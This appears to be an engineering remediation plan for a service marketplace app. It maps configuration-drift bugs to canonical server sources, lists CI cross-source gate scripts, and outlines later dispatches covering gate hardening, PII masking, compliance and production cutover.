The full list — these are smaller drift bugs that share the same pattern (multiple source surfaces, no canonical source). Each fix follows the dispatch-02 pattern: pick one canonical source, refactor consumers to read from it, add a gate.

| Bug # | Drift summary | Canonical source after fix |
|---|---|---|
| 1186 | Provider/customer route registry split | merged into Routes |
| 1187 | Provider terms hardcoded vs server CMS | server `cms.provider_terms` |
| 974 | Suki tier benefits hardcoded vs DB config | server `/suki/provider-tiers` |
| 1247 | Tier progression criteria hardcoded vs server | same as 974 |
| 1271 | axios used despite Constitution Article 7.1 forbid | native fetch wrapper |
| 1268 | Service area change has no pending state UX | server adds `pending_review` status |
| 1266 | Provider FAQ same as customer | server CMS audience filter |
| 1267 | Provider settings duplicated across menus | single `/provider/settings` |
| 706 | Boracay missing from city autocomplete | server `/cities` includes Boracay (Bug 1192 chain) |
| 1192 | Service area onboarding missing Boracay | server `/service-areas` |
| 706 mobile | City list hardcoded missing Boracay | server `/cities` |
| 269 | platformSurgeShare not validated | server schema CHECK 0..1 |
| 320 | center_lat/center_lng not bounds-checked | server CHECK 4.5..21.5 / 116..127.5 |
| 322 | radius_km/min_providers no range | server CHECK 1..100 / 1..50 |
| 1132 | CreateRecurringParams.servicePrice required client-side | remove from request type entirely |
| 1199 | Onboarding timeline not surfaced | server returns expected_review_days |
| 1230 | Provider price overrides no system min/max enforce | server schema CHECK |
| 1234 | Cert expiry not tracked in matching | server filters expired certs from candidate pool |
| 1148 | Misc minor drift items | various |

For each, the dispatch closeout adds: cross-source gate fragment, single canonical source, codemod for consumers.

---

## Dispatch 02 closeout

**Cross-source gates installed (5):**
- `a-cross-source-cancellation-policy.sh`
- `a-cross-source-brand-color.sh`
- `a-cross-source-routes.sh`
- `a-cross-source-tier-criteria.sh`
- `a-cross-source-no-axios.sh`

All gates run in CI on every PR. Any future drift (e.g., AI coder hardcoding a percentage somewhere) fails the build.

**What dispatches 03+ now have available:**
- Single source of truth for all policy text (server `cancellation_policies`)
- Single brand color via `design-tokens/build/`
- Founding tier resolves correctly in commission engine
- Routes registry typed and enforced
- Foundation for Part 4 (gate hardening) — gates already running, just need formalization in CI workflow

**Branch ready for review:** `phase/14-d02-source-of-truth`. Ken click-through:

1. Open mobile app → terms → cancellation policy section. See the 7-tier table from server.
2. Edit one tier in admin → wait 5 min → mobile reflects new value.
3. Mobile brand color is teal `#1B3A4B` everywhere (home, profile, buttons).
4. Admin assigns founding tier to a provider → commission for next booking computes 10%.
5. Search code: zero matches for raw path strings in router.push.
6. All gate scripts pass.

---

# What's next: Dispatches 03–14

This installment of Part 3 covered Dispatches 01 and 02. The remaining 12 dispatches in subsequent installments:

- **Dispatch 03 — Gate Hardening (REPORT mode)**: install Gates A through E in CI as blocking checks, retrofit the 9 phases of falsified gate logs, mutation testing CI integration. (No bug fixes per se — this dispatch is the meta-fix that prevents Phase 13's reconciliation finding from recurring.)
- **Dispatch 04 — SiguradoShield decision implementation**: per Ken's choice (Option A: pull / Option B: wire), update 6 customer surfaces + LAUNCH-LIMITATIONS.
- **Dispatch 05 — Money trust closure**: 8 client-trusted-price violations (Bugs 915, 927, 953, 1132 chain, etc.)
- **Dispatch 06 — Transactional audit completeness**: 14 transaction-audit bugs (Bugs 69, 70, 71, 78, 79, 80, 82, 83, 84, 85, 105, 106, 127, 237).
- **Dispatch 07 — Provider job execution trust**: 12 bugs in Bug 36/37/38/460/461/463 chain plus checklist/photos.
- **Dispatch 08 — NPC compliance + DSR**: 18 bugs in compliance/DSR/breach chain.
- **Dispatch 09 — PII masking sweep (admin)**: 21 bugs in admin PII chain (66, 81, 282, 287, 342, 343, 350, etc.)
- **Dispatch 10 — Provider onboarding v1.0 path**: 14 bugs covering the 10-screen onboarding + admin manual approval flow + LAUNCH-LIMITATIONS for vendor.
- **Dispatch 11 — Admin dispatch console wire-up**: 9 bugs (Bug 272 chain) plus LAUNCH-LIMITATIONS §1 + §2.
- **Dispatch 12 — Mobile customer screen polish**: 86 bugs across 43 customer screens (mostly per-screen polish from Part 2B audit findings).
- **Dispatch 13 — Mobile provider screen polish**: 64 bugs across 39 provider screens.
- **Dispatch 14 — Final smoke + production cutover**: 12 operational launch blockers (SOC2/ISO27001 audit, NPC DPO registration, BIR invoice series, DTI permit, Mayor's permit, insurance procurement, hCaptcha contract, Sentry production DSN, PayMongo merchant onboarding, S3 BIR bucket Object Lock, production Postgres PITR, DNS+TLS, Admin SSO).

After Part 3 is complete:
- **Part 4** — Gate Hardening scripts (the actual shell + CI files referenced throughout dispatches 01–14)
- **Part 5** — Ken Handbook (review process for non-developer)
